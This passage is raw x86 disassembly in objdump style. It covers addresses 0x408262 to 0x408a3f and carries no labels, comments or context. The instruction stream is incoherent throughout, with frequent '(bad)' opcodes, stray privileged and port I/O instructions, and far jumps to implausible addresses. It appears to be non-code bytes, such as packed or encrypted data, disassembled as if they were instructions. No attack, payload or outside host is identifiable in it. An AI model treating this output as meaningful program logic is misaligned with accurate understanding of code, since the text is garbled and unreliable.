  408262:	sar    BYTE PTR ds:0x8beb5752,0x9e
  408269:	ror    esi,1
  40826b:	ror    eax,cl
  40826d:	cli    
  40826e:	stos   DWORD PTR es:[edi],eax
  40826f:	test   DWORD PTR [ebx+0x27],ecx
  408272:	fcmovnb st,st(5)
  408274:	jbe    0x408208
  408276:	sbb    edx,DWORD PTR [ebp+0x3]
  408279:	je     0x408222
  40827b:	test   DWORD PTR [ebx-0x797a8104],edi
  408281:	aaa    
  408282:	mov    al,ds:0xc15bd86d
  408287:	fimul  DWORD PTR [edx-0x6d29a97f]
  40828d:	sbb    ah,BYTE PTR [ebp+ecx*1+0x52]
  408291:	enter  0x203d,0x94
  408295:	and    BYTE PTR es:[eax],bh
  408298:	fwait
  408299:	outs   dx,DWORD PTR ds:[esi]
  40829a:	loopne 0x4082d2
  40829c:	lods   al,BYTE PTR ds:[esi]
  40829d:	retf   
  40829e:	mov    bh,0x8f
  4082a0:	aas    
  4082a1:	mov    ds:0x89f98fe9,eax
  4082a6:	add    DWORD PTR [ebx],eax
  4082a8:	mov    ds:0x60d88a25,eax
  4082ad:	mov    al,ds:0xbac09f5c
  4082b2:	pop    ebp
  4082b3:	cmp    dl,dl
  4082b5:	psllw  mm4,mm5
  4082b8:	mov    ds:0x1981f66f,al
  4082bd:	repnz int3 
  4082bf:	ror    DWORD PTR [edi+0x40],0xc4
  4082c3:	fbld   TBYTE PTR [esi-0x5a147a1f]
  4082c9:	push   0xffffff9d
  4082cb:	mov    ds:0xa83f7a1b,al
  4082d0:	(bad)  
  4082d1:	jns    0x4082d4
  4082d3:	pop    edi
  4082d4:	mov    edi,0xb83687c8
  4082d9:	xchg   DWORD PTR ds:0xc70d7cd1,esp
  4082df:	mov    ds:0xce79eabb,al
  4082e4:	inc    ecx
  4082e5:	dec    esi
  4082e6:	or     ebp,DWORD PTR [edi+0x265f2673]
  4082ec:	jns    0x4082c3
  4082ee:	mov    ah,0x57
  4082f0:	out    0xcf,eax
  4082f2:	cmp    eax,0x66ad3951
  4082f7:	pop    ebx
  4082f8:	lds    edx,FWORD PTR fs:[ebp+0x12]
  4082fc:	loopne 0x4082dd
  4082fe:	je     0x40836b
  408300:	cs (bad) 
  408302:	fimul  WORD PTR [esi]
  408304:	push   ebp
  408305:	xlat   BYTE PTR ds:[ebx]
  408306:	jo     0x40832b
  408308:	imul   ebp,ecx,0xf1f1b910
  40830e:	xchg   edx,eax
  40830f:	and    eax,DWORD PTR [edi-0x50782bc3]
  408315:	sbb    BYTE PTR [ebx-0x80],bh
  408318:	or     dl,BYTE PTR [edx-0x4239cbfd]
  40831e:	push   0xffffff94
  408320:	mov    ebp,0x4c3e1137
  408325:	xchg   ecx,eax
  408326:	mov    esi,0xe96dec00
  40832b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40832c:	add    BYTE PTR ds:0x5b056ca8,bl
  408332:	mov    dl,0x97
  408334:	and    al,0xe9
  408336:	mov    edx,0x92af403f
  40833b:	and    DWORD PTR ds:0xfdc73598,0x10
  408342:	and    al,0x91
  408344:	sbb    ch,BYTE PTR [edx]
  408346:	push   esi
  408347:	xchg   edx,eax
  408348:	inc    edi
  408349:	in     al,0x92
  40834b:	fbld   TBYTE PTR [ecx+0x8]
  40834e:	inc    eax
  40834f:	mov    ds:0x18b28273,al
  408354:	jecxz  0x408375
  408356:	idiv   BYTE PTR [edi+0x65115e29]
  40835c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40835d:	(bad)  
  40835e:	in     al,dx
  40835f:	cli    
  408360:	xchg   ebx,eax
  408361:	lock mov ds:0x581c99d1,eax
  408367:	cmp    BYTE PTR [edx+0xa],dl
  40836a:	stc    
  40836b:	xor    bh,BYTE PTR [ebx+0x21]
  40836e:	(bad)  
  40836f:	lahf   
  408370:	(bad)  
  408371:	or     edi,esi
  408373:	(bad)  
  408374:	fdivr  DWORD PTR [edx+0x12]
  408377:	xchg   ebp,eax
  408378:	push   ecx
  408379:	repz cmp BYTE PTR [eax+0x53],al
  40837d:	fld    TBYTE PTR [esi-0x5abef8eb]
  408383:	dec    edi
  408384:	sub    DWORD PTR [edx-0xf],ebx
  408387:	pop    ebx
  408388:	cmp    ebp,DWORD PTR [ebx-0x231b604c]
  40838e:	test   DWORD PTR [edx],ecx
  408390:	add    al,0xb
  408392:	push   eax
  408393:	sahf   
  408394:	adc    edi,ebx
  408396:	xor    eax,0x90d770e4
  40839b:	jne    0x408364
  40839d:	push   ss
  40839e:	sub    edi,DWORD PTR [ecx]
  4083a0:	aam    0x7d
  4083a2:	add    ch,0x65
  4083a5:	add    al,0x3b
  4083a7:	push   0x44d140a
  4083ac:	mov    edi,0xc7829438
  4083b1:	mov    ecx,0x6bcf1f2a
  4083b6:	jl     0x40834d
  4083b8:	data16 out 0x0,al
  4083bb:	sub    al,0x48
  4083bd:	retf   0x8c5a
  4083c0:	jg     0x40835b
  4083c2:	push   0xe40d199b
  4083c7:	sbb    eax,0x8e16cdd6
  4083cc:	xchg   esi,eax
  4083cd:	repz (bad) 
  4083cf:	je     0x4083dd
  4083d1:	adc    al,0x24
  4083d3:	cli    
  4083d4:	jmp    0xb271afb8
  4083d9:	mov    dl,0xfa
  4083db:	btc    DWORD PTR [ecx+eiz*8],eax
  4083df:	mov    al,ds:0xb9cb16d
  4083e4:	or     BYTE PTR [eax+0x207d9542],dh
  4083ea:	pop    edx
  4083eb:	stos   BYTE PTR es:[edi],al
  4083ec:	push   0xfd18fb21
  4083f1:	xlat   BYTE PTR ds:[ebx]
  4083f2:	sar    esp,cl
  4083f4:	push   esp
  4083f5:	cmp    DWORD PTR [edx],ebx
  4083f7:	xor    esi,edx
  4083f9:	aas    
  4083fa:	fisub  WORD PTR [edi-0x36743046]
  408400:	xor    al,0x17
  408402:	lods   al,BYTE PTR ds:[esi]
  408403:	sahf   
  408404:	jg     0x408407
  408406:	out    dx,al
  408407:	cli    
  408408:	enter  0xee47,0xb2
  40840c:	cmp    DWORD PTR [ecx-0x51],eax
  40840f:	addr16 ret 0x659b
  408413:	test   al,0xe5
  408415:	call   0x46e6f6ac
  40841a:	jns    0x4083f4
  40841c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40841d:	inc    edx
  40841e:	jp     0x4083c0
  408420:	adc    ah,BYTE PTR [edi]
  408422:	mov    ds:0xc80c5575,al
  408427:	xchg   ebx,eax
  408428:	pop    ecx
  408429:	pop    es
  40842a:	fisttp DWORD PTR [ebx+0x2f]
  40842d:	jmp    0xc7ad:0xa2fab694
  408434:	out    dx,eax
  408435:	lahf   
  408436:	xchg   BYTE PTR [edx*2-0x541fd628],bh
  40843d:	mov    cl,0x9d
  40843f:	dec    ebx
  408440:	mov    ds:0xa5a8400d,eax
  408445:	mov    cl,0x3d
  408447:	aas    
  408448:	xchg   edi,edx
  40844a:	ret    
  40844b:	scas   al,BYTE PTR es:[edi]
  40844c:	mov    WORD PTR [esi-0x6a],ds
  40844f:	sub    BYTE PTR [ebx+0x4ced1893],0x6e
  408456:	in     eax,0xe8
  408458:	mov    esi,0xd8f00ea4
  40845d:	jo     0x408404
  40845f:	loopne 0x408496
  408461:	js     0x40845b
  408463:	mov    ch,0x31
  408465:	xchg   ebp,eax
  408466:	in     al,dx
  408467:	sub    DWORD PTR [ebp+0x6f4f629f],0x7a
  40846e:	test   DWORD PTR [esi],esp
  408470:	mov    dh,0x43
  408472:	stos   BYTE PTR es:[edi],al
  408473:	repnz pop ss
  408475:	xchg   edi,eax
  408476:	(bad)  
  408477:	jae    0x4084a8
  408479:	fdiv   DWORD PTR [esi+0x29]
  40847c:	dec    esp
  40847d:	and    dh,ah
  40847f:	shr    BYTE PTR [ebp-0x1f],0xd1
  408483:	pop    edx
  408484:	xchg   ebx,eax
  408485:	cli    
  408486:	and    edi,edi
  408488:	popa   
  408489:	pop    edx
  40848a:	outs   dx,DWORD PTR ds:[esi]
  40848b:	mov    eax,DWORD PTR ds:0x5bea3e43
  408491:	popa   
  408492:	repnz inc edi
  408494:	jae    0x408422
  408496:	clc    
  408497:	int    0xfa
  408499:	xlat   BYTE PTR ds:[ebx]
  40849a:	es dec edi
  40849c:	mov    ds:0x596609bd,al
  4084a1:	ins    DWORD PTR es:[edi],dx
  4084a2:	dec    esp
  4084a3:	enter  0x1112,0xe5
  4084a7:	pop    ebp
  4084a8:	shr    DWORD PTR [edx],0x71
  4084ab:	and    eax,0x4f6bf542
  4084b0:	pop    ecx
  4084b1:	mov    DWORD PTR [eax-0x200f489f],ecx
  4084b7:	(bad)  
  4084b8:	sbb    al,0xc
  4084ba:	je     0x4084fe
  4084bc:	and    al,BYTE PTR [edx]
  4084be:	jne    0x408466
  4084c0:	mov    ah,0x73
  4084c2:	std    
  4084c3:	mov    ds:0xbcf1a318,al
  4084c8:	add    eax,DWORD PTR [esi]
  4084ca:	test   BYTE PTR [eax-0xcc0e776],al
  4084d0:	rol    BYTE PTR [ebx+edi*1],cl
  4084d3:	daa    
  4084d4:	mov    ah,0x3c
  4084d6:	xlat   BYTE PTR ds:[ebx]
  4084d7:	mov    BYTE PTR [esi-0x3d8abbd9],cl
  4084dd:	sti    
  4084de:	jg     0x40851f
  4084e0:	sbb    eax,0xa050207
  4084e5:	pop    ecx
  4084e6:	loopne 0x4084a2
  4084e8:	sti    
  4084e9:	push   esi
  4084ea:	mov    al,ds:0x6a90e6c
  4084ef:	imul   eax,DWORD PTR [ecx-0x1ae22680],0x19
  4084f6:	mov    ch,0xc5
  4084f8:	adc    al,0xcb
  4084fa:	xchg   ecx,eax
  4084fb:	xchg   BYTE PTR [edx],ch
  4084fd:	lds    esp,FWORD PTR [edx]
  4084ff:	rol    ebx,0x50
  408502:	pop    eax
  408503:	(bad)  
  408504:	dec    edx
  408505:	sub    DWORD PTR [esi],esi
  408507:	cld    
  408508:	inc    ecx
  408509:	lods   al,BYTE PTR ds:[esi]
  40850a:	pop    ds
  40850b:	stc    
  40850c:	sahf   
  40850d:	rcl    ch,1
  40850f:	inc    ebx
  408510:	(bad)  
  408511:	mov    edi,0x6a59a28d
  408516:	and    DWORD PTR [ecx],eax
  408518:	xchg   DWORD PTR [edi-0x1c],esp
  40851b:	xlat   BYTE PTR ds:[ebx]
  40851c:	sub    eax,0xcccde6d3
  408521:	jmp    0x4084f7
  408523:	xchg   esp,eax
  408524:	push   ecx
  408525:	sar    BYTE PTR [ebp+0x5fd369fb],cl
  40852b:	xor    dh,BYTE PTR [edx]
  40852d:	cs std 
  40852f:	stos   BYTE PTR es:[edi],al
  408530:	pop    eax
  408531:	imul   esp,esp,0xb5045ad5
  408537:	fcomp  st(5)
  408539:	dec    edx
  40853a:	and    al,0xd6
  40853c:	cli    
  40853d:	dec    ecx
  40853e:	xchg   edi,eax
  40853f:	dec    ecx
  408540:	dec    DWORD PTR [ecx-0x1dd350c1]
  408546:	stos   DWORD PTR es:[edi],eax
  408547:	sub    al,0x34
  408549:	stos   BYTE PTR es:[edi],al
  40854a:	inc    ebp
  40854b:	push   ecx
  40854c:	mov    eax,?
  40854e:	inc    eax
  40854f:	xor    DWORD PTR ds:0xbef0151c,ecx
  408555:	fcmovu st,st(7)
  408557:	test   BYTE PTR [edx-0x489bcacd],0xe
  40855e:	jbe    0x40856d
  408560:	(bad)  
  408561:	outs   dx,DWORD PTR ds:[esi]
  408562:	scas   eax,DWORD PTR es:[edi]
  408563:	mov    cl,0xc7
  408565:	pop    ebx
  408566:	xchg   edx,eax
  408567:	push   esp
  408568:	push   esp
  408569:	fidivr WORD PTR [ebx+0x4da42d9d]
  40856f:	xchg   esp,eax
  408570:	fdivr  QWORD PTR [ebx-0x17]
  408573:	push   cs
  408574:	push   cs
  408575:	adc    ch,cl
  408577:	xchg   edi,eax
  408578:	test   eax,0x2d8dd016
  40857d:	and    cl,BYTE PTR [ebp+0x38]
  408580:	or     eax,0xe6c56e52
  408585:	faddp  st(4),st
  408587:	ins    DWORD PTR es:[edi],dx
  408588:	neg    BYTE PTR [esi]
  40858a:	test   BYTE PTR [ebx],0x49
  40858d:	jbe    0x408514
  40858f:	or     ecx,ebp
  408591:	retf   
  408592:	xchg   ebp,eax
  408593:	int3   
  408594:	mov    esp,0x837bbb0a
  408599:	push   edx
  40859a:	stc    
  40859b:	jno    0x4085ff
  40859d:	xor    al,0xfb
  40859f:	nop
  4085a0:	test   eax,0x7ca64ea3
  4085a5:	add    DWORD PTR [edi],ebx
  4085a7:	icebp  
  4085a8:	mov    eax,0x54dca54b
  4085ad:	inc    edi
  4085ae:	dec    esi
  4085af:	(bad)  
  4085b0:	fistp  QWORD PTR [edi-0x185e7944]
  4085b6:	fdiv   QWORD PTR [eax-0x1e]
  4085b9:	pop    ebp
  4085ba:	jns    0x4085e9
  4085bc:	push   edi
  4085bd:	bound  edi,QWORD PTR [edi-0x899dbe5]
  4085c3:	loope  0x4085b1
  4085c5:	sbb    eax,0x260ee846
  4085ca:	cmp    eax,DWORD PTR [edx]
  4085cc:	shr    BYTE PTR [esi-0x55e03669],cl
  4085d2:	fld    TBYTE PTR [ecx-0x6306082b]
  4085d8:	add    DWORD PTR [esi+eiz*8+0x23],0x4a
  4085dd:	cmp    DWORD PTR [ecx-0x23d1a2a0],ecx
  4085e3:	mov    edi,0x15a35c29
  4085e8:	adc    esi,eax
  4085ea:	add    bh,ch
  4085ec:	ret    0x709f
  4085ef:	test   BYTE PTR [esi],0x49
  4085f2:	scas   eax,DWORD PTR es:[edi]
  4085f3:	ss jno 0x408650
  4085f6:	mov    ebp,0x8a9abab0
  4085fb:	xor    ebx,0xffffffc8
  4085fe:	fld    TBYTE PTR [ebx-0x543f92e4]
  408604:	push   es
  408605:	pusha  
  408606:	pop    ebx
  408607:	inc    ecx
  408608:	arpl   WORD PTR [eax+eiz*8-0x2a],si
  40860c:	test   BYTE PTR [edi+0x6ab9fa7f],cl
  408612:	jp     0x4085fa
  408614:	int    0x2c
  408616:	cvttps2pi mm4,QWORD PTR [ecx-0x47]
  40861a:	in     ax,0xbc
  40861d:	sahf   
  40861e:	pop    esp
  40861f:	mov    DWORD PTR ds:0xd507c690,esi
  408625:	sub    al,0x90
  408627:	jne    0x4085db
  408629:	and    eax,0x85415a05
  40862e:	jbe    0x40869d
  408630:	dec    esi
  408631:	mov    edi,0xf3c3c585
  408636:	xchg   ecx,eax
  408637:	xchg   esp,eax
  408638:	jl     0x40869b
  40863a:	cld    
  40863b:	int    0x3c
  40863d:	mov    al,0x7e
  40863f:	fdivr  QWORD PTR [edi-0xd28bb0]
  408645:	(bad)  
  408646:	xor    ch,ah
  408648:	xchg   DWORD PTR [edi+0x37de0820],edx
  40864e:	iret   
  40864f:	fs loop 0x4086c0
  408652:	sbb    al,0x62
  408654:	sub    ebx,DWORD PTR [ecx+0x8]
  408657:	xchg   ebx,eax
  408658:	dec    edi
  408659:	mov    esi,0x96cc287d
  40865e:	pushf  
  40865f:	dec    ebp
  408660:	mov    esp,0xd4283e4f
  408665:	pusha  
  408666:	(bad)  
  408667:	fcom   DWORD PTR [edi+0x24c3b6d6]
  40866d:	mov    ah,0x5d
  40866f:	clc    
  408670:	outs   dx,BYTE PTR ds:[esi]
  408671:	jle    0x408699
  408673:	xor    bh,BYTE PTR [ebp+0x61]
  408676:	jmp    0xd338776
  40867b:	imul   esi,esp,0x74127d2e
  408681:	ins    BYTE PTR es:[edi],dx
  408682:	call   0x58a6352a
  408687:	push   edx
  408688:	dec    ebx
  408689:	inc    ecx
  40868a:	in     eax,dx
  40868b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40868d:	jge    0x408677
  40868f:	fld    DWORD PTR [esi-0x6b]
  408692:	xchg   edx,eax
  408693:	int    0x4
  408695:	mov    ebx,DWORD PTR [ebx]
  408697:	ja     0x4086ce
  408699:	int    0x43
  40869b:	lods   al,BYTE PTR ds:[esi]
  40869c:	sbb    ah,bl
  40869e:	rol    BYTE PTR [ecx],0x48
  4086a1:	outs   dx,DWORD PTR ds:[esi]
  4086a2:	int3   
  4086a3:	pop    ebx
  4086a4:	popa   
  4086a5:	mov    esp,0xa33ca367
  4086aa:	jne    0x4086ad
  4086ac:	adc    DWORD PTR [esi+eax*1],esp
  4086af:	lds    esp,FWORD PTR [ebx-0x17]
  4086b2:	add    cl,ch
  4086b4:	push   cs
  4086b5:	aas    
  4086b6:	ja     0x408639
  4086b8:	add    eax,0x7bd387df
  4086bd:	sbb    BYTE PTR [esi+0x3cbd0371],0xae
  4086c4:	adc    BYTE PTR [esi+0x31],ah
  4086c7:	xor    al,0xa6
  4086c9:	adc    al,0x28
  4086cb:	outs   dx,BYTE PTR ds:[esi]
  4086cc:	test   al,0xe0
  4086ce:	mov    ds:0xc7fe011e,eax
  4086d3:	ss sub al,0x53
  4086d6:	mov    BYTE PTR [edx+0x2192d15c],al
  4086dc:	inc    esp
  4086dd:	push   cs
  4086de:	or     DWORD PTR [edx],esi
  4086e0:	fld    QWORD PTR [esp+esi*1]
  4086e3:	fcomp  DWORD PTR [eax]
  4086e5:	es pop eax
  4086e7:	stos   DWORD PTR es:[edi],eax
  4086e8:	(bad)  [edi]
  4086ea:	mov    al,ds:0xc65bbbed
  4086ef:	xor    BYTE PTR ds:0x99a1edcf,dl
  4086f5:	mov    al,bh
  4086f7:	add    al,0xc2
  4086f9:	pop    edi
  4086fa:	ja     0x4086d3
  4086fc:	xchg   ebx,eax
  4086fd:	inc    ebp
  4086fe:	and    edx,DWORD PTR [eax-0x467132ce]
  408704:	lds    ecx,FWORD PTR [esi-0x2e]
  408707:	mov    WORD PTR [ebx],fs
  408709:	xchg   DWORD PTR [edx-0x4bdd14cb],esp
  40870f:	mov    ebp,DWORD PTR [ebp+0x15]
  408712:	cli    
  408713:	(bad)  
  408714:	jp     0x4086c5
  408716:	push   cs
  408717:	pop    ebx
  408718:	push   edx
  408719:	mov    ds:0x8ce25182,eax
  40871e:	adc    BYTE PTR [edx-0x5f],bh
  408721:	xchg   DWORD PTR [ebp-0x227eaa33],ebx
  408727:	xchg   ch,dl
  408729:	xlat   BYTE PTR ds:[ebx]
  40872a:	adc    al,0xc
  40872c:	and    eax,0x2e21fc54
  408731:	xor    al,0x44
  408733:	mov    edx,0xf7263ac4
  408738:	inc    edx
  408739:	into   
  40873a:	fld    QWORD PTR [eax]
  40873c:	dec    ecx
  40873d:	stc    
  40873e:	and    al,0xe7
  408740:	jle    0x408746
  408742:	jle    0x4086e7
  408744:	sbb    BYTE PTR [esi],al
  408746:	les    ecx,FWORD PTR [eax+edi*2]
  408749:	push   ecx
  40874a:	jne    0x408746
  40874c:	pop    ebp
  40874d:	mov    BYTE PTR [ebp-0x32772d27],0xea
  408754:	retf   0x5cde
  408757:	xor    cx,bx
  40875a:	imul   eax,ecx,0x5c
  40875d:	dec    edx
  40875e:	and    ebp,DWORD PTR [edi]
  408760:	imul   ebp,DWORD PTR [ebp-0x3bfe7e87],0xfffffffd
  408767:	mov    ch,0x59
  408769:	xchg   ebx,eax
  40876a:	fidiv  DWORD PTR [ecx-0x1f0074cc]
  408770:	and    al,0x81
  408772:	es popf 
  408774:	(bad)  
  408776:	push   esi
  408777:	outs   dx,WORD PTR ds:[esi]
  408779:	jmp    0x52280a60
  40877e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40877f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408780:	sub    esi,esp
  408782:	mov    bh,0xdf
  408784:	jnp    0x4087c9
  408786:	repz and BYTE PTR [edi],cl
  408789:	retf   
  40878a:	mov    esi,0x18ca97cb
  40878f:	mov    ah,0xd1
  408791:	and    DWORD PTR [ebp+eiz*2+0x5e],0x1b2003e4
  408799:	inc    ebp
  40879a:	push   edx
  40879b:	ltr    WORD PTR [esi+0x39]
  40879f:	das    
  4087a0:	das    
  4087a1:	cld    
  4087a2:	fdivrp st(4),st
  4087a4:	mov    bl,0x4a
  4087a6:	bound  ebp,QWORD PTR [esi+0x1c]
  4087a9:	pop    esi
  4087aa:	add    DWORD PTR [edx],edi
  4087ac:	js     0x4087d1
  4087ae:	fldl2e 
  4087b0:	xor    edx,edx
  4087b2:	inc    esi
  4087b3:	jne    0x40878f
  4087b5:	lea    edi,[ebx]
  4087b7:	xor    eax,0xd573ccb5
  4087bc:	int    0xed
  4087be:	mov    ds:0xd81f0aa7,al
  4087c3:	xchg   edx,eax
  4087c4:	sahf   
  4087c5:	add    DWORD PTR [eax+edi*4],eax
  4087c8:	test   al,0xd3
  4087ca:	cld    
  4087cb:	jae    0x4087ed
  4087cd:	xor    esp,edi
  4087cf:	outs   dx,DWORD PTR ds:[esi]
  4087d0:	ins    BYTE PTR es:[edi],dx
  4087d1:	loopne 0x408818
  4087d3:	mov    al,ds:0xc79819ac
  4087d8:	imul   ebx,DWORD PTR [eax+0x1e96155d],0x3466fba9
  4087e2:	lods   eax,DWORD PTR ds:[esi]
  4087e3:	adc    edi,edx
  4087e5:	mov    BYTE PTR [edx+0x2c0bec68],cl
  4087eb:	int3   
  4087ec:	lods   eax,DWORD PTR ds:[esi]
  4087ed:	sub    eax,0x96ae3eb0
  4087f2:	and    al,0x39
  4087f4:	(bad)  
  4087f5:	fnstenv [edi]
  4087f7:	mov    dh,0x35
  4087f9:	js     0x4087d9
  4087fb:	into   
  4087fc:	int    0x70
  4087fe:	aaa    
  4087ff:	mov    al,0xa
  408801:	out    0xe4,al
  408803:	leave  
  408804:	cwde   
  408805:	jmp    0x6528d1db
  40880a:	xor    ecx,DWORD PTR [edi]
  40880c:	push   0xffffffd0
  40880e:	dec    ebx
  40880f:	inc    ebx
  408810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408811:	mov    bh,0xf0
  408813:	push   es
  408814:	(bad)  
  408815:	shl    DWORD PTR [edi+0x1d],cl
  408818:	pop    ecx
  408819:	call   0xe60dea20
  40881e:	aam    0x10
  408820:	dec    eax
  408821:	xor    al,0x36
  408823:	fwait
  408824:	sbb    BYTE PTR fs:[ecx-0xa2d1c22],0xeb
  40882c:	push   esi
  40882d:	jl     0x408886
  40882f:	and    eax,0x39a94d39
  408834:	mov    ebp,0x66e899af
  408839:	jle    0x40880d
  40883b:	push   ebx
  40883c:	pop    edi
  40883d:	arpl   WORD PTR [ebp-0x43],cx
  408840:	add    BYTE PTR [esi],0xa1
  408843:	lahf   
  408844:	mov    edi,0xf5de3ca7
  408849:	jns    0x40883d
  40884b:	nop
  40884c:	or     DWORD PTR [ebx],0xf39d7f3e
  408852:	xchg   esi,eax
  408853:	jo     0x40886e
  408855:	leave  
  408856:	sub    ch,BYTE PTR [eax+edi*1-0xd]
  40885a:	daa    
  40885b:	out    0xb,al
  40885d:	mov    WORD PTR [edi+0x5ad6cfbf],fs
  408863:	fwait
  408864:	stc    
  408865:	aad    0x5d
  408867:	retf   0x9daf
  40886a:	sbb    DWORD PTR [esi-0x4bfbd9e6],ebx
  408870:	cdq    
  408871:	push   esi
  408872:	sar    BYTE PTR [ebx-0x2c9c22f],1
  408878:	push   0x45
  40887a:	mov    eax,0x121e232c
  40887f:	pop    ebx
  408880:	or     al,ch
  408882:	ret    
  408883:	mov    ds:0xc6ff6f62,eax
  408888:	mov    dl,0x64
  40888a:	stos   BYTE PTR es:[edi],al
  40888b:	sub    eax,DWORD PTR [eax+0x6]
  40888e:	cmp    al,0x3b
  408890:	mov    ch,0x98
  408892:	jae    0x40887a
  408894:	ret    0xb36d
  408897:	cmp    eax,0x305ae67a
  40889c:	xchg   eax,esp
  40889e:	in     al,0x7b
  4088a0:	mov    eax,ds:0xd415c477
  4088a5:	adc    al,0xbf
  4088a7:	cmp    bl,BYTE PTR ds:[edx+0x6bc894a]
  4088ae:	inc    ecx
  4088af:	sbb    bh,cl
  4088b1:	inc    ebp
  4088b2:	or     eax,0x7c2ea983
  4088b7:	sbb    ch,dl
  4088b9:	ins    BYTE PTR es:[edi],dx
  4088ba:	inc    edi
  4088bb:	(bad)  
  4088bd:	push   ds
  4088be:	cmp    DWORD PTR [edi+0x55],ecx
  4088c1:	push   ebx
  4088c2:	imul   ecx,DWORD PTR [eax-0x7d29b05],0xfffffffe
  4088c9:	and    DWORD PTR [edi+0x36f18a7b],0xd398a330
  4088d3:	ret    
  4088d4:	mov    ah,bh
  4088d6:	xor    eax,0x399985d2
  4088db:	xchg   DWORD PTR [ecx-0x5b36a27d],edi
  4088e1:	mov    al,0x75
  4088e3:	call   0xdf782f62
  4088e8:	dec    eax
  4088e9:	ins    BYTE PTR es:[edi],dx
  4088ea:	cld    
  4088eb:	aas    
  4088ec:	jae    0x40894c
  4088ee:	and    DWORD PTR [esi],0x8ebb0503
  4088f4:	xor    cl,BYTE PTR ds:0x13c8d61d
  4088fa:	stc    
  4088fb:	sub    dh,BYTE PTR [ebx]
  4088fd:	pop    ebx
  4088fe:	xchg   ebx,eax
  4088ff:	sbb    eax,0x872a7069
  408904:	inc    ebp
  408905:	imul   edx,ebx,0x2ecd5c42
  40890b:	fnsave [ebp-0x63]
  40890e:	jb     0x40889a
  408910:	ins    BYTE PTR es:[edi],dx
  408911:	mov    dl,0x53
  408913:	mov    bl,0xc0
  408915:	es jns 0x408992
  408918:	jl     0x4088c2
  40891a:	lods   al,BYTE PTR ds:[esi]
  40891b:	(bad)  
  40891c:	call   0x20d63092
  408921:	push   ebx
  408922:	pop    esi
  408923:	mov    ah,0x4e
  408925:	inc    esi
  408926:	lea    edx,[eax+ebp*8-0x3d]
  40892a:	out    dx,eax
  40892b:	retf   0xf901
  40892e:	sub    eax,0xac674612
  408933:	push   esp
  408934:	mov    ebp,ebp
  408936:	mov    ah,0x24
  408938:	test   DWORD PTR [eax-0x7f],0x6bf95222
  40893f:	aas    
  408940:	cs in  al,0xbf
  408943:	ret    0x3972
  408946:	push   edi
  408947:	add    DWORD PTR [edi],ebx
  408949:	jecxz  0x408970
  40894b:	aas    
  40894c:	sub    DWORD PTR [edi+0x7889cf78],edi
  408952:	fnsave [esi+0x1d]
  408955:	enter  0x77fb,0x4e
  408959:	push   eax
  40895a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40895b:	nop
  40895c:	scas   al,BYTE PTR es:[edi]
  40895d:	sbb    al,BYTE PTR [ebp+0x7]
  408960:	aas    
  408961:	das    
  408962:	dec    esi
  408963:	pop    ss
  408964:	pop    esi
  408965:	test   DWORD PTR [ecx],ecx
  408967:	mov    ebx,0xe3563fe7
  40896c:	pop    es
  40896d:	sub    cl,BYTE PTR [edi+0x3]
  408970:	js     0x40899f
  408972:	loop   0x4088f5
  408974:	scas   al,BYTE PTR es:[edi]
  408975:	sub    ecx,DWORD PTR [ecx]
  408977:	push   edx
  408978:	aam    0xbb
  40897a:	push   edi
  40897b:	xor    edx,edi
  40897d:	adc    bl,BYTE PTR [ebx-0x4b]
  408980:	jbe    0x408976
  408982:	adc    DWORD PTR [ecx],esp
  408984:	retf   
  408985:	and    BYTE PTR [edi+0x6c],ah
  408988:	stc    
  408989:	ret    
  40898a:	stc    
  40898b:	cmp    dl,BYTE PTR es:[edi+ecx*1-0x9]
  408990:	dec    ecx
  408991:	std    
  408992:	mov    ebp,0x26f87b21
  408997:	push   esi
  408998:	sbb    ebx,DWORD PTR [edi]
  40899a:	aaa    
  40899b:	sub    al,0xde
  40899d:	pop    ss
  40899e:	data16 std 
  4089a0:	or     al,0x9d
  4089a2:	push   ebx
  4089a3:	xor    al,0xf9
  4089a5:	xchg   edi,eax
  4089a6:	jae    0x40898c
  4089a8:	cmc    
  4089a9:	and    ebp,eax
  4089ab:	jo     0x4089b2
  4089ad:	push   cs
  4089ae:	call   0x8f6f:0xd1c6ed3c
  4089b5:	addr16 sbb edi,edx
  4089b8:	ss pop edi
  4089ba:	ret    0xf3b6
  4089bd:	adc    DWORD PTR [eax-0x17bc1018],ebx
  4089c3:	sti    
  4089c4:	popa   
  4089c5:	mul    esi
  4089c7:	xchg   ebp,eax
  4089c8:	iret   
  4089c9:	and    al,0xd5
  4089cb:	je     0x408a2a
  4089cd:	gs mov al,0x48
  4089d0:	imul   ebx,esp,0x77
  4089d3:	and    DWORD PTR [ecx-0x71c17a97],edx
  4089d9:	retf   
  4089da:	or     ecx,DWORD PTR [ebx]
  4089dc:	sti    
  4089dd:	sti    
  4089de:	pop    ebp
  4089df:	imul   edx,DWORD PTR [esi],0x15
  4089e2:	pop    esi
  4089e3:	aaa    
  4089e4:	shr    BYTE PTR [esi],cl
  4089e6:	cmp    eax,0xdf642e0c
  4089eb:	dec    eax
  4089ec:	sbb    DWORD PTR [ecx-0x76],esi
  4089ef:	lock lmsw WORD PTR [edx]
  4089f3:	jmp    0x58e1:0x290c1273
  4089fa:	and    eax,0x50f4cd7a
  4089ff:	dec    edi
  408a00:	inc    edi
  408a01:	sti    
  408a02:	repz jg 0x408a24
  408a05:	sbb    BYTE PTR cs:[ebx-0x78],cl
  408a09:	cmp    eax,0xd0325146
  408a0e:	dec    ecx
  408a0f:	mov    WORD PTR [ebp-0x7f],es
  408a12:	ds in  eax,dx
  408a14:	lock xor eax,0x9f0503b7
  408a1a:	mov    ebp,0x12b00aea
  408a1f:	sub    ah,cl
  408a21:	out    dx,al
  408a22:	leave  
  408a23:	or     bl,BYTE PTR [edi+esi*1]
  408a26:	pop    ebx
  408a27:	xchg   ebp,eax
  408a28:	test   al,0xf
  408a2a:	and    edx,DWORD PTR [ebp+0x652bd4a4]
  408a30:	pop    ss
  408a31:	pop    ebx
  408a32:	and    ch,cl
  408a34:	xchg   edi,eax
  408a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a36:	cmp    BYTE PTR [ebp-0x117eff6d],ch
  408a3c:	jno    0x408a49
  408a3e:	push   esi
  408a3f:	push   cs
